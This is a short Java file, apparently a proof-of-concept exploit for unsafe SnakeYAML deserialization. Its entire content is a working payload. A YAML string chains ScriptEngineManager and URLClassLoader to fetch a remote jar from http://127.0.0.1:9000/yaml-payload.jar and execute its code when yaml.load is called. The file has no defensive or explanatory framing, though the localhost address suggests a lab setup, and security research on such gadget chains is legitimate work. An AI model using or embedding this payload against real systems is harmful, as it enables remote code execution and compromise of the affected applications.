package Seri.SnakeYaml;

import org.yaml.snakeyaml.Yaml;
import javax.script.ScriptEngineManager;
public class YamlURLClassLoader {
    public static void main(String[] args) {
        String payload = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:9000/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]\n";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
